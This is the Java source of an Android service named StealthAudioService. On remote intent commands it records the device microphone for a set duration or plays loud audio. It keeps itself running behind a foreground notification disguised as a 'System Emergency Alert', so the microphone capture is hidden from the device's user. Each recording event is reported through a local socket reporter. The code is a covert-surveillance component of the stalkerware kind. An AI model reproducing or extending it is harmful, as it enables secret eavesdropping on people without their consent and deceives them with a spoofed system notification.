package com.stealthaudio;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.util.Date;

public class StealthAudioService extends Service {
    private static final String TAG = "StealthAudio";
    private static final int NOTIF_ID = 9981;
    private static final String CHANNEL_ID = "sa_emergency";

    private final Object threadLock = new Object();
    private Thread playbackThread;
    private Thread recordThread;

    private static void log(String msg) {
        Log.i(TAG, msg);
    }

    private static void logError(Context context, String msg, Throwable e) {
    String fullMsg = new Date() + " [StealthAudioReceiver] " + msg + (e != null ? ": " + e : "");
    Log.e(TAG, fullMsg, e);
    
    // Dynamically resolve to /data/user/0/com.stealthaudio/files/audio_errors.txt
    File logFile = new File(context.getFilesDir(), "audio_errors.txt");
    try (FileWriter writer = new FileWriter(logFile, true)) {
        writer.write(fullMsg + "\n");
    } catch (Exception ignored) {}
}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        String action = intent.getStringExtra("action");
        if ("play".equals(action)) {
            final int   type  = intent.getIntExtra("type", 1);
            final float vol   = intent.getFloatExtra("volume", 1.0f);
            final int   loops = intent.getIntExtra("loops", 0);
            startAudio(type, vol, loops);
        } else if ("record".equals(action)) {
            final int duration = intent.getIntExtra("duration", 30);
            startMicRecord(duration);
        } else if ("stop".equals(action)) {
            stopAudio();
        } else {
            stopSelf();
        }

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        log("StealthAudioService destroyed, interrupting active operation tracks.");
        synchronized (threadLock) {
            if (playbackThread != null && playbackThread.isAlive()) {
                playbackThread.interrupt();
            }
            if (recordThread != null && recordThread.isAlive()) {
                recordThread.interrupt();
            }
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startForegroundWithType(Notification notif, int serviceType) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif, serviceType);
        } else {
            startForeground(NOTIF_ID, notif);
        }
    }

    private void stopAudio() {
        synchronized (threadLock) {
            if (playbackThread != null && playbackThread.isAlive()) {
                playbackThread.interrupt();
            }
        }
        StealthAudio.stopPlayback();
        reportAudioEvent(0, "audio_done");
        stopForeground(true);
        stopSelf();
    }

    private void startMicRecord(final int duration) {
        ensureNotificationChannel();
        Notification notif = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForegroundWithType(notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(NOTIF_ID, notif);
        }

        synchronized (threadLock) {
            if (recordThread != null && recordThread.isAlive()) {
                recordThread.interrupt();
                try {
                    recordThread.join(500);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            recordThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        reportAudioEvent(0, "mic_record_started");
                        StealthMicRecorder.record(getApplicationContext(), duration);
                    } catch (Exception e) {
                        logError(getApplicationContext(), "Mic record exception", e);
                    } finally {
                        reportAudioEvent(0, "mic_record_done");
                        stopSelf();
                    }
                }
            });
            recordThread.setName("sa-mic-record");
            recordThread.start();
        }
    }

    private void startAudio(int type, float volume, int loops) {
        ensureNotificationChannel();
        Notification notif = buildNotification();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForegroundWithType(notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK);
        } else {
            startForeground(NOTIF_ID, notif);
        }

        log("Starting foreground audio blast: type=" + type + " vol=" + volume + " loops=" + loops);

        synchronized (threadLock) {
            if (playbackThread != null && playbackThread.isAlive()) {
                playbackThread.interrupt();
                try {
                    playbackThread.join(500);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }

            final int   finalType  = type;
            final float finalVol   = volume;
            final int   finalLoops = loops;

            playbackThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        reportAudioEvent(finalType, "audio_started");
                        StealthAudio.playSound(getApplicationContext(), finalType, finalVol, finalLoops);
                        log("Audio blast finished: type=" + finalType);
                    } catch (Exception e) {
                        logError(getApplicationContext(), "Playback exception type=" + finalType, e);
                    } finally {
                        reportAudioEvent(finalType, "audio_done");
                        stopSelf();
                    }
                }
            });
            playbackThread.setName("sa-playback-" + type);
            playbackThread.start();
        }
    }

    private void reportAudioEvent(final int playType, final String endpoint) {
        final String json = "{\"event\":\"" + endpoint + "\""
                          + ",\"play_audio\":" + playType + "}";
        LocalSocketReporter.send(json);
    }

    private void ensureNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID,
                    "System Emergency Alert",
                    NotificationManager.IMPORTANCE_HIGH);
            ch.setDescription("Emergency system notifications");
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder.setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setContentTitle("System Emergency Alert")
                .setContentText("Emergency notification in progress")
                .setOngoing(true)
                .build();
    }
}